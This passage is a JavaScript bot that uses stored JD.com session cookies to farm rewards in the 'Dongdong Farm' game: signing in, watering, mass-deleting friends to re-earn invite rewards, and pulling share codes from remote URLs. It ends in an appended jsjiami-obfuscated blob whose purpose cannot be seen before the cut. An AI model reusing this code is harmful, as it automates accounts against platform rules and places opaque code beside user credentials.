    if (!$.getdata(helpSuccessPeoplesKey)) {
      //把前一天的清除
      $.setdata('', timeFormat(Date.now() - 24 * 60 * 60 * 1000) + $.farmInfo.farmUserPro.shareCode);
      $.setdata('', helpSuccessPeoplesKey);
    }
    if (helpSuccessPeoples) {
      if ($.getdata(helpSuccessPeoplesKey)) {
        $.setdata($.getdata(helpSuccessPeoplesKey) + ',' + helpSuccessPeoples, helpSuccessPeoplesKey);
      } else {
        $.setdata(helpSuccessPeoples, helpSuccessPeoplesKey);
      }
    }
    helpSuccessPeoples = $.getdata(helpSuccessPeoplesKey);
  }
  if (helpSuccessPeoples && helpSuccessPeoples.length > 0) {
    message += `【您助力的好友👬】${helpSuccessPeoples.substr(0, helpSuccessPeoples.length - 1)}\n`;
  }
  if (salveHelpAddWater > 0) {
    // message += `【助力好友👬】获得${salveHelpAddWater}g💧\n`;
    console.log(`【助力好友👬】获得${salveHelpAddWater}g💧\n`);
  }
  message += `【今日剩余助力👬】${remainTimes}次\n`;
  console.log('助力好友结束，即将开始领取额外水滴奖励\n');
}
//水滴雨
async function executeWaterRains() {
  let executeWaterRain = !$.farmTask.waterRainInit.f;
  if (executeWaterRain) {
    console.log(`水滴雨任务，每天两次，最多可得10g水滴`);
    console.log(`两次水滴雨任务是否全部完成：${$.farmTask.waterRainInit.f ? '是' : '否'}`);
    if ($.farmTask.waterRainInit.lastTime) {
      if (Date.now() < ($.farmTask.waterRainInit.lastTime + 3 * 60 * 60 * 1000)) {
        executeWaterRain = false;
        // message += `【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】未到时间，请${new Date($.farmTask.waterRainInit.lastTime + 3 * 60 * 60 * 1000).toLocaleTimeString()}再试\n`;
        console.log(`\`【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】未到时间，请${new Date($.farmTask.waterRainInit.lastTime + 3 * 60 * 60 * 1000).toLocaleTimeString()}再试\n`);
      }
    }
    if (executeWaterRain) {
      console.log(`开始水滴雨任务,这是第${$.farmTask.waterRainInit.winTimes + 1}次，剩余${2 - ($.farmTask.waterRainInit.winTimes + 1)}次`);
      await waterRainForFarm();
      console.log('水滴雨waterRain');
      if ($.waterRain.code === '0') {
        console.log('水滴雨任务执行成功，获得水滴：' + $.waterRain.addEnergy + 'g');
        console.log(`【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】获得${$.waterRain.addEnergy}g水滴\n`);
        // message += `【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】获得${$.waterRain.addEnergy}g水滴\n`;
      }
    }
  } else {
    // message += `【水滴雨】已全部完成，获得20g💧\n`;
  }
}
//打卡领水活动
async function clockInIn() {
  console.log('开始打卡领水活动（签到，关注，领券）');
  await clockInInitForFarm();
  if ($.clockInInit.code === '0') {
    // 签到得水滴
    if (!$.clockInInit.todaySigned) {
      console.log('开始今日签到');
      await clockInForFarm();
      console.log(`打卡结果${JSON.stringify($.clockInForFarmRes)}`);
      if ($.clockInForFarmRes.code === '0') {
        // message += `【第${$.clockInForFarmRes.signDay}天签到】获得${$.clockInForFarmRes.amount}g💧\n`;
        console.log(`【第${$.clockInForFarmRes.signDay}天签到】获得${$.clockInForFarmRes.amount}g💧\n`)
        if ($.clockInForFarmRes.signDay === 7) {
          //可以领取惊喜礼包
          console.log('开始领取--惊喜礼包38g水滴');
          await gotClockInGift();
          if ($.gotClockInGiftRes.code === '0') {
            // message += `【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`;
            console.log(`【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`);
          }
        }
      }
    }
    if ($.clockInInit.todaySigned && $.clockInInit.totalSigned === 7) {
      console.log('开始领取--惊喜礼包38g水滴');
      await gotClockInGift();
      if ($.gotClockInGiftRes.code === '0') {
        // message += `【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`;
        console.log(`【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`);
      }
    }
    // 限时关注得水滴
    if ($.clockInInit.themes && $.clockInInit.themes.length > 0) {
      for (let item of $.clockInInit.themes) {
        if (!item.hadGot) {
          console.log(`关注ID${item.id}`);
          await clockInFollowForFarm(item.id, "theme", "1");
          console.log(`themeStep1--结果${JSON.stringify($.themeStep1)}`);
          if ($.themeStep1.code === '0') {
            await clockInFollowForFarm(item.id, "theme", "2");
            console.log(`themeStep2--结果${JSON.stringify($.themeStep2)}`);
            if ($.themeStep2.code === '0') {
              console.log(`关注${item.name}，获得水滴${$.themeStep2.amount}g`);
            }
          }
        }
      }
    }
    // 限时领券得水滴
    if ($.clockInInit.venderCoupons && $.clockInInit.venderCoupons.length > 0) {
      for (let item of $.clockInInit.venderCoupons) {
        if (!item.hadGot) {
          console.log(`领券的ID${item.id}`);
          await clockInFollowForFarm(item.id, "venderCoupon", "1");
          console.log(`venderCouponStep1--结果${JSON.stringify($.venderCouponStep1)}`);
          if ($.venderCouponStep1.code === '0') {
            await clockInFollowForFarm(item.id, "venderCoupon", "2");
            if ($.venderCouponStep2.code === '0') {
              console.log(`venderCouponStep2--结果${JSON.stringify($.venderCouponStep2)}`);
              console.log(`从${item.name}领券，获得水滴${$.venderCouponStep2.amount}g`);
            }
          }
        }
      }
    }
  }
  console.log('开始打卡领水活动（签到，关注，领券）结束\n');
}
//
async function getAwardInviteFriend() {
  await friendListInitForFarm();//查询好友列表
  //console.log(`查询好友列表数据：${JSON.stringify($.friendList)}\n`)
  if ($.friendList) {
    console.log(`\n今日已邀请好友${$.friendList.inviteFriendCount}个 / 每日邀请上限${$.friendList.inviteFriendMax}个`);
    console.log(`开始删除${$.friendList.friends && $.friendList.friends.length}个好友,可拿每天的邀请奖励`);
    if ($.friendList.friends && $.friendList.friends.length > 0) {
      for (let friend of $.friendList.friends) {
        console.log(`\n开始删除好友 [${friend.shareCode}]`);
        const deleteFriendForFarm = await request('deleteFriendForFarm', { "shareCode": `${friend.shareCode}`,"version":8,"channel":1 });
        if (deleteFriendForFarm && deleteFriendForFarm.code === '0') {
          console.log(`删除好友 [${friend.shareCode}] 成功\n`);
        }
      }
    }
    await receiveFriendInvite();//为他人助力,接受邀请成为别人的好友
    if ($.friendList.inviteFriendCount > 0) {
      if ($.friendList.inviteFriendCount > $.friendList.inviteFriendGotAwardCount) {
        console.log('开始领取邀请好友的奖励');
        await awardInviteFriendForFarm();
        console.log(`领取邀请好友的奖励结果：：${JSON.stringify($.awardInviteFriendRes)}`);
      }
    } else {
      console.log('今日未邀请过好友')
    }
  } else {
    console.log(`查询好友列表失败\n`);
  }
}
//给好友浇水
async function doFriendsWater() {
  await friendListInitForFarm();
  console.log('开始给好友浇水...');
  await taskInitForFarm();
  const { waterFriendCountKey, waterFriendMax } = $.farmTask.waterFriendTaskInit;
  console.log(`今日已给${waterFriendCountKey}个好友浇水`);
  if (waterFriendCountKey < waterFriendMax) {
    let needWaterFriends = [];
    if ($.friendList.friends && $.friendList.friends.length > 0) {
      $.friendList.friends.map((item, index) => {
        if (item.friendState === 1) {
          if (needWaterFriends.length < (waterFriendMax - waterFriendCountKey)) {
            needWaterFriends.push(item.shareCode);
          }
        }
      });
      //TODO ,发现bug,github action运行发现有些账号第一次没有给3个好友浇水
      console.log(`需要浇水的好友列表shareCodes:${JSON.stringify(needWaterFriends)}`);
      let waterFriendsCount = 0, cardInfoStr = '';
      for (let index = 0; index < needWaterFriends.length; index ++) {
        await waterFriendForFarm(needWaterFriends[index]);
        console.log(`为第${index+1}个好友浇水结果:${JSON.stringify($.waterFriendForFarmRes)}\n`)
        if ($.waterFriendForFarmRes.code === '0') {
          waterFriendsCount ++;
          if ($.waterFriendForFarmRes.cardInfo) {
            console.log('为好友浇水获得道具了');
            if ($.waterFriendForFarmRes.cardInfo.type === 'beanCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `水滴换豆卡,`;
            } else if ($.waterFriendForFarmRes.cardInfo.type === 'fastCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `快速浇水卡,`;
            } else if ($.waterFriendForFarmRes.cardInfo.type === 'doubleCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `水滴翻倍卡,`;
            } else if ($.waterFriendForFarmRes.cardInfo.type === 'signCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `加签卡,`;
            }
          }
        } else if ($.waterFriendForFarmRes.code === '11') {
          console.log('水滴不够,跳出浇水')
        }
      }
      // message += `【好友浇水】已给${waterFriendsCount}个好友浇水,消耗${waterFriendsCount * 10}g水\n`;
      console.log(`【好友浇水】已给${waterFriendsCount}个好友浇水,消耗${waterFriendsCount * 10}g水\n`);
      if (cardInfoStr && cardInfoStr.length > 0) {
        // message += `【好友浇水奖励】${cardInfoStr.substr(0, cardInfoStr.length - 1)}\n`;
        console.log(`【好友浇水奖励】${cardInfoStr.substr(0, cardInfoStr.length - 1)}\n`);
      }
    } else {
      console.log('您的好友列表暂无好友,快去邀请您的好友吧!')
    }
  } else {
    console.log(`今日已为好友浇水量已达${waterFriendMax}个`)
  }
}
//领取给3个好友浇水后的奖励水滴
async function getWaterFriendGotAward() {
  await taskInitForFarm();
  const { waterFriendCountKey, waterFriendMax, waterFriendSendWater, waterFriendGotAward } = $.farmTask.waterFriendTaskInit
  if (waterFriendCountKey >= waterFriendMax) {
    if (!waterFriendGotAward) {
      await waterFriendGotAwardForFarm();
      console.log(`领取给${waterFriendMax}个好友浇水后的奖励水滴::${JSON.stringify($.waterFriendGotAwardRes)}`)
      if ($.waterFriendGotAwardRes.code === '0') {
        // message += `【给${waterFriendMax}好友浇水】奖励${$.waterFriendGotAwardRes.addWater}g水滴\n`;
        console.log(`【给${waterFriendMax}好友浇水】奖励${$.waterFriendGotAwardRes.addWater}g水滴\n`);
      }
    } else {
      console.log(`给好友浇水的${waterFriendSendWater}g水滴奖励已领取\n`);
      // message += `【给${waterFriendMax}好友浇水】奖励${waterFriendSendWater}g水滴已领取\n`;
    }
  } else {
    console.log(`暂未给${waterFriendMax}个好友浇水\n`);
  }
}
//接收成为对方好友的邀请
async function receiveFriendInvite() {
  for (let code of newShareCodes) {
    if (code === $.farmInfo.farmUserPro.shareCode) {
      console.log('自己不能邀请自己成为好友噢\n')
      continue
    }
    await inviteFriend(code);
    // console.log(`接收邀请成为好友结果:${JSON.stringify($.inviteFriendRes.helpResult)}`)
    if ($.inviteFriendRes.helpResult.code === '0') {
      console.log(`接收邀请成为好友结果成功,您已成为${$.inviteFriendRes.helpResult.masterUserInfo.nickName}的好友`)
    } else if ($.inviteFriendRes && $.inviteFriendRes.helpResult && $.inviteFriendRes.helpResult.code === '17') {
      console.log(`接收邀请成为好友结果失败,对方已是您的好友`)
    }
  }
  // console.log(`开始接受6fbd26cc27ac44d6a7fed34092453f77的邀请\n`)
  // await inviteFriend('6fbd26cc27ac44d6a7fed34092453f77');
  // console.log(`接收邀请成为好友结果:${JSON.stringify($.inviteFriendRes.helpResult)}`)
  // if ($.inviteFriendRes.helpResult.code === '0') {
  //   console.log(`您已成为${$.inviteFriendRes.helpResult.masterUserInfo.nickName}的好友`)
  // } else if ($.inviteFriendRes.helpResult.code === '17') {
  //   console.log(`对方已是您的好友`)
  // }
}
async function duck() {
  for (let i = 0; i < 10; i++) {
    //这里循环十次
    await getFullCollectionReward();
    if ($.duckRes.code === '0') {
      if (!$.duckRes.hasLimit) {
        console.log(`小鸭子游戏:${$.duckRes.title}`);
        // if ($.duckRes.type !== 3) {
        //   console.log(`${$.duckRes.title}`);
        //   if ($.duckRes.type === 1) {
        //     message += `【小鸭子】为你带回了水滴\n`;
        //   } else if ($.duckRes.type === 2) {
        //     message += `【小鸭子】为你带回快速浇水卡\n`
        //   }
        // }
      } else {
        console.log(`${$.duckRes.title}`)
        break;
      }
    } else if ($.duckRes.code === '10') {
      console.log(`小鸭子游戏达到上限`)
      break;
    }
  }
}
// ========================API调用接口========================
//鸭子，点我有惊喜
async function getFullCollectionReward() {
  return new Promise(resolve => {
    const body = {"type": 2, "version": 6, "channel": 2};
    $.post(taskUrl("getFullCollectionReward", body), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东农场: API查询请求失败 ‼️‼️');
          console.log(JSON.stringify(err));
          $.logErr(err);
        } else {
          if (safeGet(data)) {
            $.duckRes = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

/**
 * 领取10次浇水奖励API
 */
async function totalWaterTaskForFarm() {
  const functionId = arguments.callee.name.toString();
  $.totalWaterReward = await request(functionId);
}
//领取首次浇水奖励API
async function firstWaterTaskForFarm() {
  const functionId = arguments.callee.name.toString();
  $.firstWaterReward = await request(functionId);
}
//领取给3个好友浇水后的奖励水滴API
async function waterFriendGotAwardForFarm() {
  const functionId = arguments.callee.name.toString();
  $.waterFriendGotAwardRes = await request(functionId, {"version": 4, "channel": 1});
}
// 查询背包道具卡API
async function myCardInfoForFarm() {
  const functionId = arguments.callee.name.toString();
  $.myCardInfoRes = await request(functionId, {"version": 5, "channel": 1});
}
//使用道具卡API
async function userMyCardForFarm(cardType) {
  const functionId = arguments.callee.name.toString();
  $.userMyCardRes = await request(functionId, {"cardType": cardType});
}
/**
 * 领取浇水过程中的阶段性奖励
 * @param type
 * @returns {Promise<void>}
 */
async function gotStageAwardForFarm(type) {
  $.gotStageAwardForFarmRes = await request(arguments.callee.name.toString(), {'type': type});
}
//浇水API
async function waterGoodForFarm() {
  await $.wait(1000);
  console.log('等待了1秒');

  const functionId = arguments.callee.name.toString();
  $.waterResult = await request(functionId);
}
// 初始化集卡抽奖活动数据API
async function initForTurntableFarm() {
  $.initForTurntableFarmRes = await request(arguments.callee.name.toString(), {version: 4, channel: 1});
}
async function lotteryForTurntableFarm() {
  await $.wait(2000);
  console.log('等待了2秒');
  $.lotteryRes = await request(arguments.callee.name.toString(), {type: 1, version: 4, channel: 1});
}

async function timingAwardForTurntableFarm() {
  $.timingAwardRes = await request(arguments.callee.name.toString(), {version: 4, channel: 1});
}

async function browserForTurntableFarm(type, adId) {
  if (type === 1) {
    console.log('浏览爆品会场');
  }
  if (type === 2) {
    console.log('天天抽奖浏览任务领取水滴');
  }
  const body = {"type": type,"adId": adId,"version":4,"channel":1};
  $.browserForTurntableFarmRes = await request(arguments.callee.name.toString(), body);
  // 浏览爆品会场8秒
}
//天天抽奖浏览任务领取水滴API
async function browserForTurntableFarm2(type) {
  const body = {"type":2,"adId": type,"version":4,"channel":1};
  $.browserForTurntableFarm2Res = await request('browserForTurntableFarm', body);
}
/**
 * 天天抽奖拿好礼-助力API(每人每天三次助力机会)
 */
async function lotteryMasterHelp() {
  $.lotteryMasterHelpRes = await request(`initForFarm`, {
    imageUrl: "",
    nickName: "",
    shareCode: arguments[0] + '-3',
    babelChannel: "3",
    version: 4,
    channel: 1
  });
}

//领取5人助力后的额外奖励API
async function masterGotFinishedTaskForFarm() {
  const functionId = arguments.callee.name.toString();
  $.masterGotFinished = await request(functionId);
}
//助力好友信息API
async function masterHelpTaskInitForFarm() {
  const functionId = arguments.callee.name.toString();
  $.masterHelpResult = await request(functionId);
}
//接受对方邀请,成为对方好友的API
async function inviteFriend() {
  $.inviteFriendRes = await request(`initForFarm`, {
    imageUrl: "",
    nickName: "",
    shareCode: arguments[0] + '-inviteFriend',
    version: 4,
    channel: 2
  });
}
// 助力好友API
async function masterHelp() {
  $.helpResult = await request(`initForFarm`, {
    imageUrl: "",
    nickName: "",
    shareCode: arguments[0],
    babelChannel: "3",
    version: 2,
    channel: 1
  });
}
/**
 * 水滴雨API
 */
async function waterRainForFarm() {
  const functionId = arguments.callee.name.toString();
  const body = {"type": 1, "hongBaoTimes": 100, "version": 3};
  $.waterRain = await request(functionId, body);
}
/**
 * 打卡领水API
 */
async function clockInInitForFarm() {
  const functionId = arguments.callee.name.toString();
  $.clockInInit = await request(functionId);
}

// 连续签到API
async function clockInForFarm() {
  const functionId = arguments.callee.name.toString();
  $.clockInForFarmRes = await request(functionId, {"type": 1});
}

//关注，领券等API
async function clockInFollowForFarm(id, type, step) {
  const functionId = arguments.callee.name.toString();
  let body = {
    id,
    type,
    step
  }
  if (type === 'theme') {
    if (step === '1') {
      $.themeStep1 = await request(functionId, body);
    } else if (step === '2') {
      $.themeStep2 = await request(functionId, body);
    }
  } else if (type === 'venderCoupon') {
    if (step === '1') {
      $.venderCouponStep1 = await request(functionId, body);
    } else if (step === '2') {
      $.venderCouponStep2 = await request(functionId, body);
    }
  }
}

// 领取连续签到7天的惊喜礼包API
async function gotClockInGift() {
  $.gotClockInGiftRes = await request('clockInForFarm', {"type": 2})
}

//定时领水API
async function gotThreeMealForFarm() {
  const functionId = arguments.callee.name.toString();
  $.threeMeal = await request(functionId);
}
/**
 * 浏览广告任务API
 * type为0时, 完成浏览任务
 * type为1时, 领取浏览任务奖励
 */
async function browseAdTaskForFarm(advertId, type) {
  const functionId = arguments.callee.name.toString();
  if (type === 0) {
    $.browseResult = await request(functionId, {advertId, type});
  } else if (type === 1) {
    $.browseRwardResult = await request(functionId, {advertId, type});
  }
}
// 被水滴砸中API
async function gotWaterGoalTaskForFarm() {
  $.goalResult = await request(arguments.callee.name.toString(), {type: 3});
}
//签到API
async function signForFarm() {
  const functionId = arguments.callee.name.toString();
  $.signResult = await request(functionId);
}
/**
 * 初始化农场, 可获取果树及用户信息API
 */
async function initForFarm() {
  return new Promise(resolve => {
    const option =  {
      url: `${JD_API_HOST}?functionId=initForFarm`,
      body: `body=${escape(JSON.stringify({"version":4}))}&appid=wh5&clientVersion=9.1.0`,
      headers: {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "zh-CN,zh;q=0.9",
        "cache-control": "no-cache",
        "cookie": cookie,
        "origin": "https://home.m.jd.com",
        "pragma": "no-cache",
        "referer": "https://home.m.jd.com/myJd/newhome.action",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
        "Content-Type": "application/x-www-form-urlencoded"
      },
      timeout: 10000,
    };
    $.post(option, (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东农场: API查询请求失败 ‼️‼️');
          console.log(JSON.stringify(err));
          $.logErr(err);
        } else {
          if (safeGet(data)) {
            $.farmInfo = JSON.parse(data)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

// 初始化任务列表API
async function taskInitForFarm() {
  console.log('\n初始化任务列表')
  const functionId = arguments.callee.name.toString();
  $.farmTask = await request(functionId);
}
//获取好友列表API
async function friendListInitForFarm() {
  $.friendList = await request('friendListInitForFarm', {"version": 4, "channel": 1});
  // console.log('aa', aa);
}
// 领取邀请好友的奖励API
async function awardInviteFriendForFarm() {
  $.awardInviteFriendRes = await request('awardInviteFriendForFarm');
}
//为好友浇水API
async function waterFriendForFarm(shareCode) {
  const body = {"shareCode": shareCode, "version": 6, "channel": 1}
  $.waterFriendForFarmRes = await request('waterFriendForFarm', body);
}
async function showMsg() {
  if ($.isNode() && process.env.FRUIT_NOTIFY_CONTROL) {
    $.ctrTemp = `${process.env.FRUIT_NOTIFY_CONTROL}` === 'false';
  } else if ($.getdata('jdFruitNotify')) {
    $.ctrTemp = $.getdata('jdFruitNotify') === 'false';
  } else {
    $.ctrTemp = `${jdNotify}` === 'false';
  }
  if ($.ctrTemp) {
    $.msg($.name, subTitle, message, option);
    if ($.isNode()) {
      allMessage += `${subTitle}\n${message}${$.index !== cookiesArr.length ? '\n\n' : ''}`;
      // await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName}`, `${subTitle}\n${message}`);
    }
  } else {
    $.log(`\n${message}\n`);
  }
}

function timeFormat(time) {
  let date;
  if (time) {
    date = new Date(time)
  } else {
    date = new Date();
  }
  return date.getFullYear() + '-' + ((date.getMonth() + 1) >= 10 ? (date.getMonth() + 1) : '0' + (date.getMonth() + 1)) + '-' + (date.getDate() >= 10 ? date.getDate() : '0' + date.getDate());
}
function readShareCode() {
  console.log(`开始`)
  return new Promise(async resolve => {
    $.get({url: "https://cdn.jsdelivr.net/gh/wuzhi-docker1/RandomShareCode@main/JD_Fruit.json",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，将切换为备用API`)
          console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
          $.get({url: `https://raw.githubusercontent.com/shuyeshuye/RandomShareCode/main/JD_Fruit.json`, 'timeout': 10000},(err, resp, data)=>{
          data = JSON.parse(data);})
        } else {
          if (data) {
            console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
            data = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
    await $.wait(10000);
    resolve()
  })
}
function shareCodesFormat() {
  return new Promise(async resolve => {
    // console.log(`第${$.index}个京东账号的助力码:::${jdFruitShareArr[$.index - 1]}`)
    newShareCodes = [];
    if (jdFruitShareArr[$.index - 1]) {
      newShareCodes = jdFruitShareArr[$.index - 1].split('@');
    } else {
      console.log(`由于您第${$.index}个京东账号未提供shareCode,将采纳本脚本自带的助力码\n`)
      const tempIndex = $.index > shareCodes.length ? (shareCodes.length - 1) : ($.index - 1);
      newShareCodes = shareCodes[tempIndex].split('@');
    }
    const readShareCodeRes = await readShareCode();
    if (readShareCodeRes && readShareCodeRes.code === 200) {
      // newShareCodes = newShareCodes.concat(readShareCodeRes.data || []);
      newShareCodes = [...new Set([...newShareCodes, ...(readShareCodeRes.data || [])])];
    }
    console.log(`第${$.index}个京东账号将要助力的好友${JSON.stringify(newShareCodes)}`)
    resolve();
  })
}
function requireConfig() {
  return new Promise(resolve => {
    console.log('开始获取配置文件\n')
    notify = $.isNode() ? require('./sendNotify') : '';
    //Node.js用户请在jdCookie.js处填写京东ck;
    const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
    const jdFruitShareCodes = $.isNode() ? require('./jdFruitShareCodes.js') : '';
    //IOS等用户直接用NobyDa的jd cookie
    if ($.isNode()) {
      Object.keys(jdCookieNode).forEach((item) => {
        if (jdCookieNode[item]) {
          cookiesArr.push(jdCookieNode[item])
        }
      })
      if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
    } else {
      let cookiesData = $.getdata('CookiesJD') || "[]";
      cookiesData = jsonParse(cookiesData);
      cookiesArr = cookiesData.map(item => item.cookie);
      cookiesArr.reverse();
      cookiesArr.push(...[$.getdata('CookieJD2'), $.getdata('CookieJD')]);
      cookiesArr.reverse();
      cookiesArr = cookiesArr.filter(item => item !== "" && item !== null && item !== undefined);
    }
    console.log(`共${cookiesArr.length}个京东账号\n`)
    if ($.isNode()) {
      Object.keys(jdFruitShareCodes).forEach((item) => {
        if (jdFruitShareCodes[item]) {
          jdFruitShareArr.push(jdFruitShareCodes[item])
        }
      })
    } else {
      const boxShareCodeArr = ['jd_fruit1', 'jd_fruit2', 'jd_fruit3', 'jd_fruit4'];
      const boxShareCodeArr2 = ['jd2_fruit1', 'jd2_fruit2', 'jd2_fruit3', 'jd2_fruit4'];
      const isBox1 = boxShareCodeArr.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      const isBox2 = boxShareCodeArr2.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      isBox = isBox1 ? isBox1 : isBox2;
      if (isBox1) {
        let temp = [];
        for (const item of boxShareCodeArr) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdFruitShareArr.push(temp.join('@'));
      }
      if (isBox2) {
        let temp = [];
        for (const item of boxShareCodeArr2) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdFruitShareArr.push(temp.join('@'));
      }
    }
    // console.log(`jdFruitShareArr::${JSON.stringify(jdFruitShareArr)}`)
    // console.log(`jdFruitShareArr账号长度::${jdFruitShareArr.length}`)
    console.log(`您提供了${jdFruitShareArr.length}个账号的农场助力码\n`);
    resolve()
  })
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      url: "https://me-api.jd.com/user_new/info/GetJDUserInfoUnion",
      headers: {
        Host: "me-api.jd.com",
        Accept: "*/*",
        Connection: "keep-alive",
        Cookie: cookie,
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
        "Accept-Language": "zh-cn",
        "Referer": "https://home.m.jd.com/myJd/newhome.action?sceneval=2&ufc=&",
        "Accept-Encoding": "gzip, deflate, br"
      }
    }
    $.get(options, (err, resp, data) => {
      try {
        if (err) {
          $.logErr(err)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === "1001") {
              $.isLogin = false; //cookie过期
              return;
            }
            if (data['retcode'] === "0" && data.data && data.data.hasOwnProperty("userInfo")) {
              $.nickName = data.data.userInfo.baseInfo.nickname;
            }
          } else {
            $.log('京东服务器返回空数据');
          }
        }
      } catch (e) {
        $.logErr(e)
      } finally {
        resolve();
      }
    })
  })
}
function request(function_id, body = {}, timeout = 1000){
  return new Promise(resolve => {
    setTimeout(() => {
      $.get(taskUrl(function_id, body), (err, resp, data) => {
        try {
          if (err) {
            console.log('\n东东农场: API查询请求失败 ‼️‼️')
            console.log(JSON.stringify(err));
            console.log(`function_id:${function_id}`)
            $.logErr(err);
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
            }
          }
        } catch (e) {
          $.logErr(e, resp);
        } finally {
          resolve(data);
        }
      })
    }, timeout)
  })
}
function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}
function taskUrl(function_id, body = {}) {
  return {
    url: `${JD_API_HOST}?functionId=${function_id}&appid=wh5&body=${escape(JSON.stringify(body))}`,
    headers: {
      Cookie: cookie,
      UserAgent: $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
    },
    timeout: 10000,
  }
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
var _0xodE='jsjiami.com.v6',_0x2e44=[_0xodE,'W8KfXsOPw4c=','P8KWVMOYQg==','w6RCDMObw5xsw47CoXwnMMOMIsOKA8OYPiZeMcKLw63ChxwLw5TCn35Ow5DCtUnCs2fDu8KzwoLDqMOOfVsyw6sHwrbCrMOEMcOnw7MswonCjVvDpsOow6TCosKaw5fCr8Kvwpg6wrjCs3zDpcKsw781HiXCjcOUPMKoNB/DkF7Dv3jCg8O1w5E1wq/DtQvDr8OJw67DjhU7w7/DuB3DlsORJmQ=','w7NPw6UWw4s=','F8Ozw4rDvlXCvcOcwoVEwojDpsOyJcKbwpR/w4DDrsKOTcKMwrYaRsK1HQLCmMOzwqc2w4DCgzrCicKMfRLDngB8w5HCmWBAw5TCvEDDncKmIA4BJmhlw4VQIsOAwp3DnCfDkhpjdsO9McKsMcOjAFRSO8OdF8KWGyrCjcOtwp8Zw5XCuWrDisOhbsOMTFvCjRoaT8ONdcO7eMOCccKwDcOEw4QdEAgYwprCpMKZNsOPwrnDtsK/w6jCvGTClMOXw41Iw4/CvMKgEARKYsOYYSEywqLCsAvCusOacsOjDcOmHMO2w5BwwpknD8OLw7HCiiljUxDCgUrCtcKfw50zZsONScO5IsOUwpNhw47Dh8O9JREfKsOYYR3DpEwpw55j','wqnDi8KWw7pVw7cIw7XDhsKcR8Ocw7lxD00Pwo5GaMOsBHjCm8KOwpUsDMKhEl9rwoYTwqk4wpw+SCLCgEHCosKSJCcRC8OAJENcwqhmHHl8dXDDn8O6wq4WF8Kfw7pKbiwqUcKAK8Kew4XDr13Ds8KhTcKgw4lWcj/CqcOiMi9uwp/DhsKzQsO/w5NUwrQyw7E0','UsOAw5fCpg==','w7PCnsOOw4Jl','woJtwoVyMw==','dsOOwpVsWw==','UxdzdEk=','F8KYbMOOdw==','ccOlw5TCvMKN','EUXCq0TChA==','KBfCn2lI','DsKwXMOwbQ==','b8KkD8K5ZA==','SMOwwrhyVA==','QsKmw7jDjcOZ','w45QLcOnw6U=','wp